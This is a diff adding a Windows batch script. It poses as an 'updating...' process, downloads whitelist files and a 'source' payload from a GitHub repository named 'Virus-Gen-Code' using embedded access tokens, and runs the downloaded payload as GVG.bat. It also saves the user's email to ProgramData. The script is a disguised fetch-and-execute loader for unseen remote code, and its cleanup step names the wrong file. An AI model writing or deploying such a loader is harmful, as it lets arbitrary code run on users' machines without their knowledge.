@@ -1,0 +1,86 @@
+@echo off && Title updating... && cd C:\users\%username%\AppData
+::WL check 1
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist?token=ANX5WBDD77SYIF3W2Z6NZ2DAKLF2Y"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+del error.txt
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >WL1.sav)
+)
+if exist C:\ProgramData\GVGemail.sav (goto WLcheck) else (goto email_error)
+:EMnxt
+del WL1.sav
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Device-whitelist?token=ANX5WBBAGWZK5EQDX2PTK2LAKLISU"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+del error.txt
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >WL2.sav)
+)
+>nul find "%username%" WL2.sav && (
+  goto deviceNXT
+) || (
+  goto Whitelist_error
+)
+:deviceNXT
+del WL2.sav  
+:: download source
+Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/source?token=ANX5WBA7VJKKNIDNUWT4H43AKLLZC"
+for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
+Call :Download "%url%" "%File%"
+del error.txt
+If exist "%File%" ( 
+    ( Type "%File%")>con
+( Type "%File%" >GVG.bat)
+)
+call GVG.bat
+del GVG.batz
+exit
+:Download <url> <File>
+Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')" >error.txt
+>nul find "At" error.txt && (
+  goto offline
+) || (
+  exit /b
+)
+:offline
+del error.txt
+echo.
+echo this program requires an internet connection
+echo.
+echo press any key to exit...
+pause >nul
+:WLcheck
+< C:\ProgramData\GVGemail.sav (
+  set /p email=
+)
+>nul find "%email%" WL1.sav && (
+  goto EMnxt
+) || (
+  goto Whitelist_error
+)
+:Whitelist_error
+if exist WL1.sav (del WL1.sav)
+if exist WL2.sav (del WL2.sav)
+echo.
+echo [31merror, you are not whitelisted[0m
+echo.
+echo press any key to exit...
+pause >nul
+exit
+:email_error
+echo [31merror code: 02[0m
+echo [31merror: email save was not detected[0m
+echo [31merror type: resolvable[0m
+echo [31mhow to replicate: delete C:\ProgramData\GVGemail.sav[0m
+echo [31mhow to fix: Program will now ask for your email, email will be saved so this error will not show up again[0m
+echo [31mextra information: email is required by github to verify your identity, email WILL BE PUBLIC on github.[0m
+echo.
+echo press any key to fill out email...
+pause >nul
+set /p email=email:
+echo %email%>C:\ProgramData\GVGemail.sav
+if exist C:\ProgramData\GVGemail.sav (echo [92memail was successfully saved![0m) else (exit)
+goto WLcheck
